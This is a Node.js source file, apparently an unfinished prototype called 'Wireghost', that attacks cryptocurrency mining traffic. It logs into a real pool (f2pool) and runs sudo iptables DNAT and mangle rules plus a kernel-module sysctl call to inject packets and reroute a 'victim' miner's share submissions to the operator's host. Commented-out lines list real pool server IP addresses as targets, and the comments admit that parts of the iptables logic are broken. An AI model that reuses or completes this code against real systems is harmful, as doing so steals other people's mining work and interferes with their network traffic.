//STDIO
const readline = require('readline');
const rl = readline.createInterface({
	input: process.stdin,
	output: process.stdout
});
const net = require('net');
const { exec } = require('child_process');

//Pattern to match to know when to send packet 
//FIXME This doesn't work because marked packets aren't seen by this computer unless they are incoming
exec('sudo iptables -t mangle -A PREROUTING -m string --string "inject me, k thx bye" --algo bm -j MARK --set-mark 1510', (error, stdout, stderr) => {
	if (error) {
		console.log(`Iptables error: ${error}`);
		return;
	}
	if (stdout) {
		console.log(`Iptables output: ${stdout}`);
	}
	if (stderr) {
		console.log(`Iptables stderr: ${stderr}`);
	}
});

var server = net.createServer(function(socket) {
	socket.on('data', (data) => {
		console.log("If this gets called, it's because we got a share, job id is: " + data);
		//Let the pool connection send it
		client.write(data);
	});
});

server.listen(8080, '127.0.0.1');

//Create connection with pool
var client = net.Socket();
client.connect(3333,"stratum.f2pool.com", () => {
	console.log("Connnected, sending subscribe");
	client.write('{"id": 0, "method": "mining.subscribe", "params": ["cgminer/4.8.0"]}\n', () => {
		console.log("Sending authorize");
		client.write('{"id": 1, "method": "mining.authorize", "params": ["casprevi.1", "123"]}\n');
	});
	exec('./go.sh', (err, stdout, stderr) => {
		if (err) {
			console.log(`Wireghost starting error: ${err}`);
		}
		if (stdout) {
			console.log(`Wireghost response: ${stdout}`);
		}
		if (stderr) {
			console.log(`Wireghost starting stderr: ${stderr}`);
		}
	});
});
/*
client.connect(2345, "10.0.2.13", () => {
	console.log("Connected to .13, sending write");
	client.write("Hello, .13\n");
	//Client is connected, start Wireghost
	exec('./go.sh', (err, stdout, stderr) => {
		if (err) {
			console.log(`Wireghost starting error: ${err}`);
		}
		if (stdout) {
			console.log(`Wireghost response: ${stdout}`);
		}
		if (stderr) {
			console.log(`Wireghost starting stderr: ${stderr}`);
		}
	});
}); */
client.setEncoding('utf8');
client.on('data', (data) => {
	console.log(`Received data: ${data}`);
	if (data.includes("take")) { //Replace with mining.notify
		console.log("Got a job, send to victim: " + data);
		if (data.includes("true")) {
			console.log("Job is refreshing");
		}
		//var jobId = data.split('"')[9];
		var words = data.split(" ");
		var word = words[1];
		console.log("Word to take: " + words[1]);
		var addr = client.remoteAddress;
		//if (addr == "139.129.198.250" || addr == "183.60.85.218" || addr == "60.205.131.231" ||
		   // addr == "115.28.114.193") {
		  //Everything in this if statement except the sysctl call is broken.  The iptables commands aren't right
		  if (addr == "10.0.2.12" || addr == "10.0.2.13") {
		  	console.log("Injecting");
			exec('sudo sysctl net.wireghost.inject="'+word+'"', (err, stdout, stderr) => {
				if (err) {
					console.log(`Sysctl call error: ${err}`);
				}
				if (stdout) {
					console.log(`Sysctl call response: ${stdout}`);
				}
			});
			/*Send wireghost a garbage packet that tells wireghost to inject a packet and drop this one so
			* the pool doesn't see the message */
			client.write("inject me, k thx bye");

			//Add rule to catch our jobs Replace with mining.submit and ${jobID}
			exec('sudo iptables -t nat -A PREROUTING -p tcp -j DNAT --to-destination 10.0.2.12:2345 -m string --string "submit" --algo bm -m string --string "' +
			word + '" --algo bm', 
				(err, stdout, stderr) => {
					if (err) {
						console.log(`Iptables future packet rerouting failed, have to abort: ${err}`);
						return;
					}
					if (stdout) {
						console.log(`Iptables future packet rerouting output: ${stdout}`);
					}
					if (stderr) {
						console.log(`Iptables future packet rerouting stderr: ${stderr}`);
					}
				}
			);
		}

	}
	if (data.includes("submit")) {
		console.log(`Got a submission for ${data}`);
		exec('iptables -t nat -D PREROUTING -p tcp -j DNAT --to-destination 10.0.2.12:2345 -m string --string "submit" --algo bm -m string --string "'+word+'" --algo bm')
	}
	if (data.includes("result")) {
		console.log("Got a result: " + data);
	}
});
//Handle Ctrl+C
rl.on('SIGINT', () => {
	console.log("Exiting Wireghost, bye bye");
	exec('sudo iptables -t mangle -D PREROUTING -m string --string "inject me, k thx bye" --algo bm -j MARK --set-mark 1510', (err, stdout, stderr) => {
		if (err) {
			console.log(`Problem removing iptables rule, be sure to do it manually`);
			console.log('sudo iptables -t mangle -D PREROUTING -m string --string "inject me, k thx bye" --algo bm -j MARK --set-mark 1510');
		}
	});
	exec('sudo rmmod wireghost', (err, stdout, stderr) => {
		if (err) {
			console.log(`Could not remove wireghost, do it manually`);
			console.log('sudo rmmod wireghost');
		}
	});
	process.exit();
});
